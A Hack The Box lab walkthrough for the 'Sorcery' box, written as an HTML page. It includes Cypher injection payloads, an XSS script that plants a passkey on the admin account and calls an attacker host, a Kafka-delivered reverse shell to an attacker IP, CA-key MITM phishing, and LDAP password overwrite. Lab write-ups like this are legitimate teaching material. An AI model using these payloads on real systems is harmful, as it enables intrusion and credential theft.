@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Sorcery — QA210</title>
+<meta name="description" content="Hack The Box Sorcery — Insane difficulty walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔮</text></svg>">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root {
+  --bg-primary:#0a0e17;--bg-secondary:#111827;--bg-tertiary:#1a2236;
+  --bg-code:#0d1117;--border:#1e293b;--border-light:#1a2332;
+  --text-primary:#e2e8f0;--text-secondary:#94a3b8;--text-muted:#64748b;
+  --accent-green:#22d3ee;--accent-blue:#818cf8;--accent-red:#f87171;
+  --accent-yellow:#fbbf24;--accent-purple:#c084fc;--accent-orange:#fb923c;
+  --accent-cyan:#22d3ee;--accent-pink:#f472b6;
+  --link:#818cf8;--link-hover:#a5b4fc;
+  --scrollbar-thumb:#1e293b;--scrollbar-track:#0a0e17;
+  --toc-active:#818cf8;
+  --callout-info-bg:rgba(129,140,248,0.08);--callout-info-border:#818cf8;
+  --callout-warn-bg:rgba(251,191,36,0.08);--callout-warn-border:#fbbf24;
+  --callout-danger-bg:rgba(248,113,113,0.08);--callout-danger-border:#f87171;
+  --callout-success-bg:rgba(34,211,238,0.08);--callout-success-border:#22d3ee;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--scrollbar-track)}
+::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#334155}
+a{color:var(--link);text-decoration:none;transition:color .2s}
+a:hover{color:var(--link-hover)}
+#three-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.35}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(10,14,23,0.88);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.1rem;color:var(--accent-cyan);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-pink)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.85rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}
+.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.78rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(129,140,248,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.72rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:linear-gradient(135deg,var(--accent-pink),var(--accent-purple));color:#fff;font-size:.68rem;font-weight:700;padding:2px 12px;border-radius:12px;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.85rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.92rem;font-weight:600;color:var(--text-primary)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.2rem}
+.attack-path .arrow{color:var(--accent-cyan)}
+.attack-path .host{color:var(--accent-cyan);font-weight:700}
+.attack-path .technique{color:var(--accent-orange)}
+.attack-path .cred{color:var(--accent-purple)}
+.main-content h2{font-size:1.55rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.1rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:.95rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.7rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.68rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}
+.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.88rem}
+.callout p{margin:0;color:var(--text-secondary)}
+.callout-title{font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}
+.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}
+.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}
+.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}
+.callout-success .callout-title{color:var(--callout-success-border)}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}
+.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.73rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}
+.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="#">Writeups</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">☰</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">✕</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
+
+<main class="main-content">
+
+<div class="page-hero">
+  <span class="box-badge">Insane</span>
+  <h1>HTB: Sorcery</h1>
+  <div class="meta"><span>QA210</span><span class="sep">·</span><span>Jun 14, 2025</span><span class="sep">·</span><span>10 Containers · Neo4j · Kafka · FreeIPA</span></div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Box</div><div class="value">Sorcery</div></div>
+  <div class="info-item"><div class="label">Difficulty</div><div class="value" style="color:var(--accent-pink)">Insane</div></div>
+  <div class="info-item"><div class="label">OS</div><div class="value">Linux</div></div>
+  <div class="info-item"><div class="label">User</div><div class="value">01:11:36</div></div>
+  <div class="info-item"><div class="label">Root</div><div class="value">2:31:53</div></div>
+  <div class="info-item"><div class="label">Creator</div><div class="value">tomadimitrie</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">SORCERY</span> <span class="arrow">→</span> Cypher Injection <span class="arrow">→</span> <span class="technique">registration key</span> <span class="arrow">→</span> <span class="cred">Seller</span></div>
+  <div class="step"><span class="host">SORCERY</span> <span class="arrow">→</span> XSS + Passkey Registration <span class="arrow">→</span> <span class="cred">Admin JWT</span></div>
+  <div class="step"><span class="host">DNS</span> <span class="arrow">→</span> Debug SSRF + Kafka wire protocol <span class="arrow">→</span> <span class="cred">user@dns</span></div>
+  <div class="step"><span class="host">DNS</span> <span class="arrow">→</span> FTP CA key + MITM phishing <span class="arrow">→</span> <span class="cred">tom_summers</span></div>
+  <div class="step"><span class="host">MAIN</span> <span class="arrow">→</span> Xvfb framebuffer <span class="arrow">→</span> <span class="cred">tom_summers_admin</span></div>
+  <div class="step"><span class="host">MAIN</span> <span class="arrow">→</span> Docker cred helper RE + OTP <span class="arrow">→</span> <span class="cred">Registry</span> <span class="arrow">→</span> <span class="cred">donna_adams</span></div>
+  <div class="step"><span class="host">FREEIPA</span> <span class="arrow">→</span> LDAP password change <span class="arrow">→</span> <span class="cred">ash_winter</span></div>
+  <div class="step"><span class="host">MAIN</span> <span class="arrow">→</span> Sudo rule abuse + SSSD restart <span class="arrow">→</span> <span class="cred">root</span></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Recon</h2>
+
+<h3 id="recon-nmap">Initial Scanning</h3>
+<p>Two ports: SSH (22) and HTTPS (443). The OpenSSH version pegs this as Ubuntu 24.04 Noble. The TTL on port 443 is one hop further than SSH, hinting at a containerized architecture:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -p 22,443 -sCV 10.129.25.147
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
+443/tcp open  ssl/http nginx 1.27.1
+| ssl-cert: Subject: commonName=sorcery.htb
+|_http-title: Did not follow redirect to https://sorcery.htb/</code></pre>
+</div>
+
+<h3 id="recon-sub">Subdomain Fuzz</h3>
+<p>The server redirects to <code>sorcery.htb</code> and uses host-based routing. Fuzzing with <code>ffuf</code> finds <code>git</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ffuf -u https://10.129.25.147 -H "Host: FUZZ.sorcery.htb" \
+    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
+git   [Status: 200, Size: 13592]</code></pre>
+</div>
+
+<h3 id="recon-site">sorcery.htb</h3>
+<p>The main site is a login/register page built with Next.js. Registration has an optional "Registration Key" field. There's also a <strong>Passkey</strong> login option. Registering a normal account gives access to a product store dashboard. Chrome DevTools provides a WebAuthn emulator for testing passkeys locally.</p>
+
+<h3 id="recon-git">git.sorcery.htb</h3>
+<p>Gitea 1.22.1 hosting a single repo: <code>nicole_sullivan/infrastructure</code>. The repo contains the full source code and a <code>docker-compose.yml</code> defining 10 containers: backend (Rust/Rocket), frontend (Next.js), Neo4j, Kafka, DNS (Rust + dnsmasq), MailHog, VSFTPd, Gitea, mail_bot, and nginx.</p>
+
+<h3 id="recon-source">Source Code Analysis</h3>
+<p>The backend is a Rust Rocket app backed by Neo4j. Key findings:</p>
+<ul>
+  <li><strong>Cypher injection</strong> in the <code>Model</code> derive macro — <code>format!()</code> concatenates user input directly into Cypher queries</li>
+  <li><strong>XSS</strong> in product descriptions — <code>dangerouslySetInnerHTML</code> renders raw HTML</li>
+  <li><strong>Headless Chrome bot</strong> visits every new product as admin with a scoped 60-second JWT</li>
+  <li><strong>DNS container</strong> pipes Kafka messages directly into <code>bash -c</code></li>
+  <li><strong>Debug port tool</strong> sends raw TCP data to any host:port (SSRF primitive)</li>
+  <li><strong>FTP</strong> serves the Root CA cert and encrypted private key</li>
+  <li>Blog posts hint at phishing rules and that <code>tom_summers</code> failed a phishing test</li>
+</ul>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-admin">sorcery.htb Admin Access</h2>
+
+<h3 id="sqli">Cypher Injection</h3>
+<p>The product GUID in <code>/dashboard/store/&lt;id&gt;</code> is concatenated unsafely into a Cypher query. Adding a double quote crashes the query, confirming injection. A UNION-based payload exfiltrates data:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cypher</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-sql">x" }) RETURN result UNION ALL
+MATCH (c: Config) RETURN {
+  id: "cfg", name: c.registration_key,
+  description: "key", is_authorized: true, created_by_id: "x"
+} AS result //</code></pre>
+</div>
+
+<p>This leaks the seller <strong>registration key</strong>: <code>dd05d743-b560-45dc-9a09-43ab18c7a513</code>. The same technique dumps user hashes (Argon2 — uncrackable) and can modify data.</p>
+
+<h3 id="xss-passkey">XSS → Admin Passkey Registration</h3>
+<p>As a Seller, inserting XSS in a product description triggers the headless Chrome bot. The bot's JWT is scoped to three paths: product view, and the two passkey registration endpoints. The attack registers a passkey I control on the admin's account:</p>
+
+<ol>
+  <li>XSS calls Next.js server actions (<code>startRegistration</code>, <code>finishRegistration</code>) via <code>Next-Action</code> headers</li>
+  <li>The challenge is forwarded to my Flask server, which generates an EC2 keypair and builds the attestation object</li>
+  <li>The signed credential is sent back to <code>finishRegistration</code></li>
+  <li>The Flask server then authenticates as admin using the new passkey, obtaining a full admin JWT</li>
+</ol>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">// XSS payload — register passkey on admin account
+(async () => {
+  const START = '062f18334e477c66c7bf63928ee38e241132fabc';
+  const FINISH = '60971a2b6b26a212882926296f31a1c6d7373dfa';
+  const SRV = 'http://10.10.14.61';
+
+  // Step 1: startRegistration (admin cookie auto-attaches)
+  const r1 = await fetch('/dashboard/profile', {
+    method:'POST', body:'[]',
+    headers:{'Next-Action':START,'Content-Type':'text/plain;charset=UTF-8'}
+  });
+  const challenge = JSON.parse((await r1.text()).split('\n')[1].substring(2)).result.challenge;
+
+  // Step 2: solve challenge on our server
+  const r2 = await fetch(SRV+'/solve', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({challenge:challenge.publicKey.challenge, rp:challenge.publicKey.rp})
+  });
+  const credential = await r2.json();
+
+  // Step 3: finishRegistration
+  await fetch('/dashboard/profile', {
+    method:'POST', body:JSON.stringify([credential]),
+    headers:{'Next-Action':FINISH,'Content-Type':'text/plain;charset=UTF-8'}
+  });
+  new Image().src = SRV+'/done';
+})();</code></pre>
+</div>
+
+<h3 id="shortcut-admin">Shortcut: Password Overwrite via Cypher</h3>
+<p>An unintended shortcut skips the XSS entirely. Generate an Argon2 hash and overwrite the admin's password directly via Cypher injection:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Generate hash
+$ python3 -c "from argon2 import PasswordHasher; print(PasswordHasher().hash('qa210'))"
+$argon2id$v=19$m=65536,t=3,p=4$...
+
+# Overwrite via injection
+UUID"}) MATCH (u:User {username:"admin"})
+SET u.password = "$argon2id$v=19$m=65536..."
+RETURN {id:"x",name:"done",description:"pw changed",is_authorized:true,created_by_id:"x"} AS result //</code></pre>
+</div>
+
+<p>Log in with the new password. Then enroll a passkey via Chrome DevTools to access the admin-only pages.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-dns">Shell as user@dns</h2>
+
+<h3 id="kafka-rce">Kafka Wire Protocol RCE</h3>
+<p>As admin, the <strong>Debug Port Tool</strong> provides raw TCP access to any internal host. The DNS container's Rust binary subscribes to the Kafka <code>update</code> topic and pipes messages into <code>bash -c</code> — no auth on Kafka. I craft a Kafka Produce request in binary:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">import binascii, struct, sys
+
+def kafka_produce_hex(topic, message):
+    value = message.encode()
+    msg_body = struct.pack('>bb', 0, 0)
+    msg_body += struct.pack('>i', -1)
+    msg_body += struct.pack('>i', len(value)) + value
+    crc = binascii.crc32(msg_body) & 0xffffffff
+    full_msg = struct.pack('>I', crc) + msg_body
+    msg_set = struct.pack('>q', 0) + struct.pack('>i', len(full_msg)) + full_msg
+    partition = struct.pack('>i', 0) + struct.pack('>i', len(msg_set)) + msg_set
+    topic_b = topic.encode()
+    topic_data = struct.pack('>h', len(topic_b)) + topic_b
+    topic_data += struct.pack('>i', 1) + partition
+    body = struct.pack('>hi', 1, 5000) + struct.pack('>i', 1) + topic_data
+    client = b'qa210'
+    header = struct.pack('>hhi', 0, 0, 1) + struct.pack('>h', len(client)) + client
+    request = header + body
+    return (struct.pack('>i', len(request)) + request).hex()
+
+print(kafka_produce_hex("update", sys.argv[1]))</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 kafka_msg.py 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1'
+0000006e00000000...
+
+# Paste hex into Debug tool → kafka:9092
+$ nc -lvnp 443
+user@7bfb70ee5b9c:/app$</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-tom">Shell as tom_summers</h2>
+
+<h3 id="ca-key">CA Keypair Recovery</h3>
+<p>From the DNS container, FTP allows anonymous access. The root CA certificate and encrypted private key are in <code>/pub</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">user@dns$ python3 -c '
+import ftplib
+ftp = ftplib.FTP("ftp"); ftp.login(); ftp.cwd("pub")
+ftp.retrbinary("RETR RootCA.crt", open("/tmp/RootCA.crt","wb").write)
+ftp.retrbinary("RETR RootCA.key", open("/tmp/RootCA.key","wb").write)
+'</code></pre>
+</div>
+
+<p>The private key is encrypted with PBKDF2. Cracking with hashcat mode 24420 yields passphrase <strong>password</strong>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ hashcat -m 24420 RootCA.key.hash rockyou.txt
+$PEM$...:password
+
+$ openssl rsa -in RootCA.key -out RootCA-dec.key</code></pre>
+</div>
+
+<h3 id="phish">DNS + MITM Phishing</h3>
+<p>Write a DNS record for a subdomain pointing to my IP, then use <code>mitmdump</code> as a reverse proxy to Gitea with the CA-signed certificate:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># On DNS container: add record
+user@dns$ echo "10.10.14.61 qa.sorcery.htb" > /dns/hosts-user
+user@dns$ pkill dnsmasq
+user@dns$ /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts &
+
+# On attacker: sign cert + run proxy
+$ openssl genrsa -out server.key 2048
+$ openssl x509 -req -in <(openssl req -new -key server.key -subj '/CN=qa.sorcery.htb') \
+    -CA RootCA.crt -CAkey RootCA-dec.key -CAcreateserial -out server.crt
+$ cat server.crt server.key > server.pem
+
+$ mitmdump --mode reverse:https://git.sorcery.htb/ -p 443 \
+    --ssl-insecure --certs '*=server.pem' -q -s phish_addon.py</code></pre>
+</div>
+
+<p>Send a phishing email to <code>tom_summers@sorcery.htb</code> via MailHog's SMTP. The mail_bot follows links from matching recipients. After ensuring the cert passes the three checks (internal domain, HTTPS, CA-signed), tom_summers submits their Gitea creds to the proxy:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">>> POST https://git.sorcery.htb/user/login
+   user_name: tom_summers
+   password: jNsMKQ6k2.XDMPu.</code></pre>
+</div>
+
+<p>SSH with the captured creds:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sshpass -p 'jNsMKQ6k2.XDMPu.' ssh tom_summers@sorcery.htb
+tom_summers@main:~$ cat user.txt
+5c4d7491************************</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-tom-admin">Shell as tom_summers_admin</h2>
+
+<h3 id="xvfb">Xvfb Framebuffer</h3>
+<p>A process running as <code>tom_summers_admin</code> opens <code>mousepad</code> (a GUI text editor) with <code>passwords.txt</code> on a virtual X display via Xvfb. The framebuffer file is world-readable:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">tom_summers@main$ ls -l /xorg/xvfb/
+-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Apr 18 16:04 Xvfb_screen0
+
+tom_summers@main$ convert xwd:Xvfb_screen0 Xvfb_screen0.png
+# The PNG shows mousepad with: dWpuk7cesBjT-</code></pre>
+</div>
+
+<p>The password <strong>dWpuk7cesBjT-</strong> works for tom_summers_admin via <code>su</code> or SSH.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-donna">Shell as donna_adams</h2>
+
+<h3 id="docker-registry">Docker Registry Auth</h3>
+<p><code>tom_summers_admin</code> can <code>sudo -u rebecca_smith strace</code> and <code>sudo -u rebecca_smith docker login</code>. The Docker credential helper (<code>docker-credential-docker-auth</code>) is a .NET binary. Stracing it reveals the password:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">tom_summers_admin@main$ until p=$(pgrep -u rebecca_smith -of 'docker-credential-docker-auth'); \
+    do sleep 0.01; done; sudo -u rebecca_smith strace -s 128 -p "$p"
+# ... lots of output ...
+write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54) = 54</code></pre>
+</div>
+
+<h3 id="otp">OTP Recovery</h3>
+<p>The static password is <strong>-7eAZDp9-f9mg</strong> but there's also an OTP suffix. Reverse-engineering the .NET binary reveals the algorithm:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">csharp</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-csharp">// HandleOtp — seeds .NET Random with minute/10 + uid
+new Random(DateTime.Now.Minute / 10 + (int)GetCurrentExecutableOwner().UserId)
+    .Next(100000, 999999);</code></pre>
+</div>
+
+<p>Only 6 OTPs exist per hour (one per 10-minute block). A Python port generates them:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 dotnet_otp.py
+minute 00-09 (seed 2003): 229732
+minute 10-19 (seed 2004): 699914
+minute 20-29 (seed 2005): 270098
+minute 30-39 (seed 2006): 740280
+minute 40-49 (seed 2007): 310463
+minute 50-59 (seed 2008): 780645</code></pre>
+</div>
+
+<h3 id="registry-dump">Registry Layer Dump</h3>
+<p>With <code>rebecca_smith:&lt;password&gt;&lt;otp&gt;</code>, authenticate to the Docker Registry on localhost:5000. Use DockerRegistryGrabber to dump the <code>test-domain-workstation</code> image layers:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ uv run drg.py http://localhost --dump test-domain-workstation \
+    -U rebecca_smith -P'-7eAZDp9-f9mg740280'
+
+# Extracted docker-entrypoint.sh:
+#!/bin/bash
+ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
+    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir</code></pre>
+</div>
+
+<p>SSH as <code>donna_adams</code> with the leaked password:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sshpass -p '3FEVPCT_c3xDH' ssh donna_adams@sorcery.htb
+donna_adams@main:~$</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-ash">Shell as ash_winter</h2>
+
+<h3 id="freeipa-ldap">FreeIPA LDAP Password Change</h3>
+<p>The host is joined to a FreeIPA realm. <code>donna_adams</code> has an indirect role <code>change_userPassword_ash_winter_ldap</code>, granting write access to <code>ash_winter</code>'s <code>userPassword</code> attribute:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">donna_adams@main$ ldapmodify -Y GSSAPI -H ldap://dc01.sorcery.htb <<'EOF'
+dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
+changetype: modify
+replace: userPassword
+userPassword: qa210qa210
+EOF
+modifying entry "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb"</code></pre>
+</div>
+
+<p>SSH as ash_winter (password expired — change on first login).</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
